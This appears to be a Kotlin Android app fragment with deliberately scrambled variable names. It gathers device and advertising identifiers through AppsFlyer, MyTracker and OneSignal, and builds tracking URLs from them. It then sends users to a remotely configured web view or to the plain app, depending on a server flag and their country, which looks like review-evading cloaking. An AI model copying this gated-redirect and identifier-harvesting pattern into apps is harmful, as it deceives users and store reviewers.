package com.hugogames.projectarnol.ewwesdad
import com.onesignal.OneSignal
import org.json.JSONException
import org.json.JSONObject

import com.my.tracker.MyTracker
import org.koin.android.ext.android.inject
import org.koin.core.qualifier.named
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import androidx.fragment.app.Fragment
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import com.appsflyer.AppsFlyerLib
import com.hugogames.projectarnol.BuildConfig
import com.hugogames.projectarnol.R
import com.hugogames.projectarnol.xxczcsc.Jusuhshuxygcgdf
import com.hugogames.projectarnol.xxczcsc.xxvxvxhs.Nosooskoxjichuygyf


class Mlslsokxjicudhf : Fragment() {
    private lateinit var rokekokos: Context
    val jcjnjnxjncjnxhvusdh: SharedPreferences by inject(named("SharedPreferences"))




    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.uxixixushgyfgyfs, container, false)
    }





    override fun onAttach(context: Context) {
        super.onAttach(context)
        rokekokos = context
    }

    private fun gokokfokkojicxuvuhdshu(bvkiviojv: String) {
        OneSignal.setExternalUserId(
            bvkiviojv,
            object : OneSignal.OSExternalUserIdUpdateCompletionHandler {
                override fun onSuccess(eoeokwko: JSONObject) {

                    try {
                        if (eoeokwko.has("push") && eoeokwko.getJSONObject("push").has("success")) {
                            val nnxzncjznnush = eoeokwko.getJSONObject("push").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for push status: $nnxzncjznnush"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (eoeokwko.has("email") && eoeokwko.getJSONObject("email").has("success")) {
                            val orokokekoekowjisjijidjix =
                                eoeokwko.getJSONObject("email").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for email status: $orokokekoekowjisjijidjix"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (eoeokwko.has("sms") && eoeokwko.getJSONObject("sms").has("success")) {
                            val bbvjjcjjckiiixcjjivjidsji = eoeokwko.getJSONObject("sms").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for sms status: $bbvjjcjjckiiixcjjivjidsji"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                }

                override fun onFailure(error: OneSignal.ExternalIdError) {

                    OneSignal.onesignalLog(
                        OneSignal.LOG_LEVEL.VERBOSE,
                        "Set external user id done with error: $error"
                    )
                }
            })
    }


    override fun onStart() {
        super.onStart()
        val forkkokook = "sub_id_5="

        val xjjiciikkikizkikikiisjji = jcjnjnxjncjnxhvusdh.getString("countryDev", null)
        val gcgxv = "deviceID="
        val xzhuchuhuzxhuzhuxcjiasjica = jcjnjnxjncjnxhvusdh.getString("wv", null)
        val nnnxncjijijishudhuhuf = Build.VERSION.RELEASE



        val eokwkokoskosdalplpsdpxpcl = AppsFlyerLib.getInstance().getAppsFlyerUID(rokekokos)
        val bbbchchjjvkkd = MyTracker.getTrackerParams()


        val eokwkooks = Intent(rokekokos, Jusuhshuxygcgdf::class.java)
        val apapssaokokoijxjix = "deeporg"
        val xjcjijixjihushud = Intent(rokekokos, Nosooskoxjichuygyf::class.java)
        val dokoxklpzlpc = jcjnjnxjncjnxhvusdh.getString("deepSt", null)
        val hdwwa = "sub_id_4="

        val dsjiofjijijixcjizx = jcjnjnxjncjnxhvusdh.getString("country", null)
        val rokeokeokkskosijx = "sub_id_1="

        val sowksokslpplxlpclpxkocji = jcjnjnxjncjnxhvusdh.getString("mainId", null)
        val zozkokxjis = BuildConfig.APPLICATION_ID
        val epwlwlpw = jcjnjnxjncjnxhvusdh.getString("apps", null)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)

        gokokfokkojicxuvuhdshu(sowksokslpplxlpclpxkocji.toString())
        val gxyzui = jcjnjnxjncjnxhvusdh.getString("appCamp", null)
        val xllxlxlockxjisjishudhu = "sub_id_6="
        val bcbcjxnidjf: String? = jcjnjnxjncjnxhvusdh.getString("instId", null)
        val wopwllp = "naming"
        val wpqlqplwkookskodjixcji = "ad_id="
        bbbchchjjvkkd.customUserId = sowksokslpplxlpclpxkocji


        val gkofokdslplpzxckokozx = "$xzhuchuhuzxhuzhuxcjiasjica$rokeokeokkskosijx$gxyzui&$gcgxv$eokwkokoskosdalplpsdpxpcl&$wpqlqplwkookskodjixcji$sowksokslpplxlpclpxkocji&$hdwwa$zozkokxjis&$forkkokook$nnnxncjijijishudhuhuf&$xllxlxlockxjisjishudhu$wopwllp"
        val okekorkoekokosko = "$xzhuchuhuzxhuzhuxcjiasjica$gcgxv$sowksokslpplxlpclpxkocji&$wpqlqplwkookskodjixcji$bcbcjxnidjf&$hdwwa$zozkokxjis&$forkkokook$nnnxncjijijishudhuhuf&$xllxlxlockxjisjishudhu$wopwllp"
        val aplslpapllpqkokoskoxjic = "$xzhuchuhuzxhuzhuxcjiasjica$rokeokeokkskosijx$dokoxklpzlpc&$gcgxv$eokwkokoskosdalplpsdpxpcl&$wpqlqplwkookskodjixcji$sowksokslpplxlpclpxkocji&$hdwwa$zozkokxjis&$forkkokook$nnnxncjijijishudhuhuf&$xllxlxlockxjisjishudhu$apapssaokokoijxjix"
        val bbcxnvijjdshufhuduh = "$xzhuchuhuzxhuzhuxcjiasjica$rokeokeokkskosijx$dokoxklpzlpc&$gcgxv$sowksokslpplxlpclpxkocji&$wpqlqplwkookskodjixcji$bcbcjxnidjf&$hdwwa$zozkokxjis&$forkkokook$nnnxncjijijishudhuhuf&$xllxlxlockxjisjishudhu$apapssaokokoijxjix"

        when(epwlwlpw) {
            "1" ->
                if(gxyzui!= "null") {
                    jcjnjnxjncjnxhvusdh.edit().putString("link", gkofokdslplpzxckokozx).apply()
                    startActivity(eokwkooks)
                    activity?.finish()
                } else if (dokoxklpzlpc!=null||xjjiciikkikizkikikiisjji!!.contains(dsjiofjijijixcjizx.toString())) {
                    jcjnjnxjncjnxhvusdh.edit().putString("link", aplslpapllpqkokoskoxjic).apply()
                    startActivity(eokwkooks)
                    activity?.finish()
                } else {
                    startActivity(xjcjijixjihushud)
                    activity?.finish()
                }
            "0" ->
                if(dokoxklpzlpc!=null) {
                    jcjnjnxjncjnxhvusdh.edit().putString("link", bbcxnvijjdshufhuduh).apply()
                    startActivity(eokwkooks)
                    activity?.finish()
                } else if (xjjiciikkikizkikikiisjji!!.contains(dsjiofjijijixcjizx.toString())) {
                    jcjnjnxjncjnxhvusdh.edit().putString("link", okekorkoekokosko).apply()
                    startActivity(eokwkooks)
                    activity?.finish()
                } else {
                    startActivity(xjcjijixjihushud)
                    activity?.finish()
                }
        }
    }

}